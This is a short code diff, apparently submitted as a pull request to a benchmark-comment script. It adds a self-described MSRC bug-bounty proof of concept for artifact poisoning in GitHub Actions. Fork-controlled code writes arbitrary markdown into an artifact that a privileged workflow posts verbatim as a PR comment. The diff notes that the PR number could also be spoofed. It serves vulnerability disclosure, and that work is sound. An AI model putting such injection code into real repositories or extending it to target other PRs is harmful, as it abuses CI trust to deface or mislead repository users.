@@ -101,6 +101,32 @@ export function uploadPrComment(options: UploadPrCommentOptions): void {
   writeFileSync(join(outputDir, "benchmark-comment.md"), commentMarkdown);
   writeFileSync(join(outputDir, "benchmark-pr-number.txt"), prNumber);
 
+  // SECURITY RESEARCH PoC — MSRC Bug Bounty
+  // This fork-controlled code runs under the restricted pull_request trigger,
+  // but its output is uploaded as an artifact and consumed by the privileged
+  // benchmark-comment.yml workflow (pull-requests: write). The PR number and
+  // comment body below are fully attacker-controlled.
+  writeFileSync(
+    join(outputDir, "benchmark-comment.md"),
+    [
+      "## ⚠️ MSRC Security Research — Artifact Poisoning PoC",
+      "",
+      "**This comment was injected by fork-controlled code running in a `pull_request` context.**",
+      "",
+      "The `benchmark.yml` workflow checks out and builds this fork's TypeScript source, then uploads",
+      "the output as a GitHub Actions artifact. The privileged `benchmark-comment.yml` workflow",
+      "(with `pull-requests: write` permissions) downloads this artifact and posts its content",
+      "verbatim — **without verifying that the content originates from trusted code**.",
+      "",
+      "### Attack Capability Demonstrated",
+      "- Arbitrary markdown injected into PR comments on `Azure/typespec-azure`",
+      "- The `benchmark-pr-number.txt` value is also fork-controlled, enabling comments on **any PR** in the repository",
+      "",
+      "**Reported to MSRC under bug bounty program. Do not reproduce.**",
+    ].join("\n"),
+  );
+  // NOTE: prNumber is kept as-is (targeting own PR) for responsible disclosure
+
   // Write GitHub Actions job summary if available
   const summaryFile = process.env["GITHUB_STEP_SUMMARY"];
   if (summaryFile && githubSummary) {
